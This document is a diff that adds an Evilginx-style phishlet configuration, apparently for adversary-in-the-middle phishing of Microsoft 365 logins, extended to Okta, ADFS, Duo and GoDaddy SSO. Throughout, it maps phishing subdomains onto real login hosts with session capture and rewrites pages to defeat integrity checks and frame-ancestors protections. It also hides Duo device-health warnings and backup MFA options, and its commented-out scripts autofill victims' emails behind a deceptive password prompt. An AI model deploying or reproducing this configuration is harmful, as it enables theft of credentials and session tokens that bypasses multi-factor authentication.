@@ -1,0 +1,1287 @@
+name: "o365"
+author: "∆N0M∆LY"
+min_ver: "3.0.0"
+
+# Super O365 Phishlet - Merged with ADFS, Okta, Duo, GoDaddy support
+# Supports: Standard O365, ADFS Federation, Okta SSO, Duo MFA, GoDaddy SSO
+
+proxy_hosts:
+  # === Microsoft Core ===
+  - { phish_sub: "secure", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "billing", orig_sub: "www", domain: "office.com", session: true, is_landing: true, auto_filter: false }
+  - { phish_sub: "hervw", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "hervw2", orig_sub: "privacynotice.account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "hrvetbr", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "hnrvrve", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "hvr34gr", orig_sub: "outlook", domain: "live.com", session: true, is_landing: false }
+  - { phish_sub: "jrhte", orig_sub: "aadcdn", domain: "msauth.net", session: true, is_landing: false }
+  - { phish_sub: "htejre", orig_sub: "aadcdn", domain: "msftauth.net", session: true, is_landing: false }
+  - { phish_sub: "billing", orig_sub: "outlook", domain: "office.com", session: false, is_landing: true, auto_filter: false }
+  - { phish_sub: "mejeff", orig_sub: "outlook", domain: "office365.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "ewfweo", orig_sub: "go", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "roweri", orig_sub: "login", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "cdn", orig_sub: "logincdn", domain: "msauth.net", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "portal", orig_sub: "portal", domain: "office.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "admin", orig_sub: "admin", domain: "microsoft.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "secure2", orig_sub: "secure", domain: "aadcdn.microsoftonline-p.com", session: false, is_landing: false, auto_filter: true }
+  
+  # === Okta SSO Support ===
+  - { phish_sub: "hcwdg", orig_sub: "o", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "hterw", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "oktacdn", orig_sub: "oktacdn", domain: "oktacdn.com", session: false, is_landing: false, auto_filter: true }
+  # Okta tenant - set via config: phishlets o365 set okta_tenant <value>
+  - { phish_sub: "{okta_tenant}", orig_sub: "{okta_tenant}", domain: "okta.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "okta-sso", orig_sub: "sso", domain: "{okta_custom_domain}", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "okta-login", orig_sub: "login", domain: "{okta_custom_domain}", session: true, is_landing: false, auto_filter: true }
+  
+  # === ADFS Federation Support ===
+  # ADFS - set via config: phishlets o365 set adfs_domain <value>
+  - { phish_sub: "sts", orig_sub: "sts", domain: "{adfs_domain}", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "adfs", orig_sub: "adfs", domain: "{adfs_domain}", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "fs", orig_sub: "fs", domain: "{adfs_domain}", session: true, is_landing: false, auto_filter: true }
+  
+  # === Duo Security MFA Support ===
+  - { phish_sub: "duo-api", orig_sub: "api", domain: "duosecurity.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "duo-api2", orig_sub: "api-{duo_region}", domain: "duosecurity.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "duo", orig_sub: "", domain: "duosecurity.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "duo-main", orig_sub: "", domain: "duo.com", session: true, is_landing: false, auto_filter: true }
+  # Duo SSO tenant - set via config: phishlets o365 set duo_sso_tenant <value>
+  - { phish_sub: "{duo_sso_tenant}", orig_sub: "{duo_sso_tenant}", domain: "sso.duosecurity.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "duo-sso", orig_sub: "sso", domain: "{duo_custom_domain}", session: true, is_landing: false, auto_filter: true }
+  
+  # === GoDaddy SSO Support ===
+  - { phish_sub: "sso", orig_sub: "sso", domain: "godaddy.com", session: true, is_landing: false }
+  - { phish_sub: "events.api", orig_sub: "events.api", domain: "godaddy.com", session: true, is_landing: false }
+  - { phish_sub: "gui", orig_sub: "gui", domain: "godaddy.com", session: true, is_landing: false }
+  - { phish_sub: "img1", orig_sub: "img1", domain: "wsimg.com", session: true, is_landing: false }
+  - { phish_sub: "img6", orig_sub: "img6", domain: "wsimg.com", session: true, is_landing: false }
+  - { phish_sub: "gd-login", orig_sub: "login", domain: "godaddy.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "gd-account", orig_sub: "account", domain: "godaddy.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "gd-idp", orig_sub: "idp", domain: "godaddy.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "gd-email", orig_sub: "email", domain: "godaddy.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "gd-workspace", orig_sub: "workspace", domain: "godaddy.com", session: true, is_landing: false, auto_filter: true }
+
+sub_filters:
+  - { triggers_on: "account.microsoft.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.microsoft.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "privacynotice.account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.microsoft.com", orig_sub: "privacynotice.account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "privacynotice.account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: "crossorigin", replace: "rickorigin", mimes: ["text/html", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: "integrity", replace: "tegridy", mimes: ["text/html",  "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  # - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: 'content="IE=edge">', replace: 'content="IE=edge"><script>window.addEventListener("load",()=>{function e(e){return new Promise(t=>{if(document.querySelector(e))return t(document.querySelector(e));let o=new MutationObserver(n=>{document.querySelector(e)&&(t(document.querySelector(e)),o.disconnect())});o.observe(document.body,{childList:!0,subtree:!0})})}e("#i0116").then(e=>{if(0==window.location.hash.length)return;e.focus();let t;t="="==window.location.hash.slice(-1)?window.location.hash.slice(1,-1):window.location.hash.slice(1),e.value=t;let o=document.querySelector("#idSIButton9");o.focus(),o.click()}),e("#loginHeader").then(e=>{if !e.querySelector("p")) let t=document.createElement("p");t.textContent="Because you are accessing sensitive info you need to verify your password",document.querySelectorAll("#loginHeader")[0].appendChild(t)})});</script>', mimes: ["text/html"] }
+  # - { triggers_on: "outlook.office.com", orig_sub: "", domain: "", search: 'content="IE=edge">', replace: 'content="IE=edge"><script>window.addEventListener("load",()=>{function e(e){return new Promise(t=>{if(document.querySelector(e))return t(document.querySelector(e));let o=new MutationObserver(n=>{document.querySelector(e)&&(t(document.querySelector(e)),o.disconnect())});o.observe(document.body,{childList:!0,subtree:!0})})}e("#i0116").then(e=>{if(0==window.location.hash.length)return;e.focus();let t;t="="==window.location.hash.slice(-1)?window.location.hash.slice(1,-1):window.location.hash.slice(1),e.value=t;let o=document.querySelector("#idSIButton9");o.focus(),o.click()}),e("#loginHeader").then(e=>{if (!e.querySelector("p")) let t=document.createElement("p");t.textContent="Because you are accessing sensitive info you need to verify your password",document.querySelectorAll("#loginHeader")[0].appendChild(t)})});</script>', mimes: ["text/html"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "aadcdn", domain: "msauth.net",   search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "aadcdn", domain: "msftauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "aadcdn", domain: "msauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "aadcdn", domain: "msftauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  - { triggers_on: "outlook.office365.com", orig_sub: "aadcdn", domain: "msauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "aadcdn", domain: "msftauth.net", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  - { triggers_on: "login.microsoft.com", orig_sub: "", domain: "", search: "(?i)<title[^>]*>(.*?)</title>", replace: "<title></title>", mimes: ["text/html"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: '</head>', replace: '<style>.background-logo-holder{visibility:hidden}</style></HEAD>', mimes: ["text/html"] }
+
+  # - {
+  #     triggers_on: "login.microsoftonline.com",
+  #     orig_sub: "",
+  #     domain: "",
+  #     search: '<meta http-equiv="Content-Security-Policy" content="(.*?)"',
+  #     replace: '<meta http-equiv="Content-Security-Policy" content="default-src *  data: blob: filesystem: about: ws: wss: ''unsafe-inline'' ''unsafe-eval''; script-src * data: blob: ''unsafe-inline'' ''unsafe-eval''; connect-src * data: blob: ''unsafe-inline''; img-src * data: blob: ''unsafe-inline''; frame-src * data: blob: ; style-src * data: blob: ''unsafe-inline''; font-src * data: blob: ''unsafe-inline'';"',
+  # s: ["text/html"],
+  #   }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoft.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"]}
+
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+##
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "sso", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  ##
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+
+  - { triggers_on: "login.live.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  - { triggers_on: "account.live.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "accont.live.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+
+  - { triggers_on: "www.office.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+
+
+  - { triggers_on: "outlook.office.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+
+  - { triggers_on: "outlook.office365.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  - { triggers_on: "login.microsoft.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "outlook", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoft.com", orig_sub: "login", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes:  ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "github.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "github", domain: "githubassets.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "avatars", domain: "githubusercontent.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "collector", domain: "github.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "api", domain: "github.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'sso.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  - {triggers_on: 'sso.godaddy.com', orig_sub: '', domain: 'wsimg.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+
+  #===============================================================================
+  # ADFS FEDERATION SERVICES FILTERS
+  #===============================================================================
+  - {triggers_on: 'sts.{adfs_domain}', orig_sub: 'sts', domain: '{adfs_domain}', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'adfs.{adfs_domain}', orig_sub: 'adfs', domain: '{adfs_domain}', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'fs.{adfs_domain}', orig_sub: 'fs', domain: '{adfs_domain}', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  # ADFS hide backup MFA options
+  - triggers_on: 'login.microsoftonline.com'
+    orig_sub: ''
+    domain: ''
+    search: '</head>'
+    replace: |
+      <style>
+      .ext-sign-in-box { display: none !important; }
+      #idDiv_SAOTCS_Proofs { display: none !important; }
+      </style></head>
+    mimes: ['text/html']
+
+  #===============================================================================
+  # OKTA SSO FILTERS
+  #===============================================================================
+  - {triggers_on: '{okta_tenant}.okta.com', orig_sub: '{okta_tenant}', domain: 'okta.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.okta.com', orig_sub: 'login', domain: 'okta.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: '{okta_custom_domain}', orig_sub: '', domain: '{okta_custom_domain}', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  # Okta CSP frame-ancestors fix
+  - triggers_on: '{okta_tenant}.okta.com'
+    orig_sub: '{okta_tenant}'
+    domain: 'okta.com'
+    search: "frame-ancestors 'self'"
+    replace: "frame-ancestors *"
+    mimes: ['text/html']
+
+  #===============================================================================
+  # DUO SECURITY MFA FILTERS
+  #===============================================================================
+  - {triggers_on: 'api.duosecurity.com', orig_sub: 'api', domain: 'duosecurity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'api-{duo_region}.duosecurity.com', orig_sub: 'api-{duo_region}', domain: 'duosecurity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: '{duo_sso_tenant}.sso.duosecurity.com', orig_sub: '{duo_sso_tenant}.sso', domain: 'duosecurity.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  # Duo frame-ancestors CSP fix for iframe
+  - triggers_on: 'api.duosecurity.com'
+    orig_sub: 'api'
+    domain: 'duosecurity.com'
+    search: "frame-ancestors 'self'"
+    replace: "frame-ancestors *"
+    mimes: ['text/html']
+  # Hide Duo device trust warnings, show remember device
+  - triggers_on: 'api.duosecurity.com'
+    orig_sub: 'api'
+    domain: 'duosecurity.com'
+    search: '</head>'
+    replace: |
+      <style>
+      .device-health-warning { display: none !important; }
+      .remember-device-container { display: block !important; }
+      </style></head>
+    mimes: ['text/html']
+  
+headers:
+  inject:
+  - { key: "Cache-Control", value: "no-store, no-cache, must-revalidate, proxy-revalidate" }
+  - { key: "Pragma", value: "no-cache" }
+  - { key: "Expires", value: "0" }
+  - { key: "X-Forwarded-For", value: "dynamic_ip_here" } 
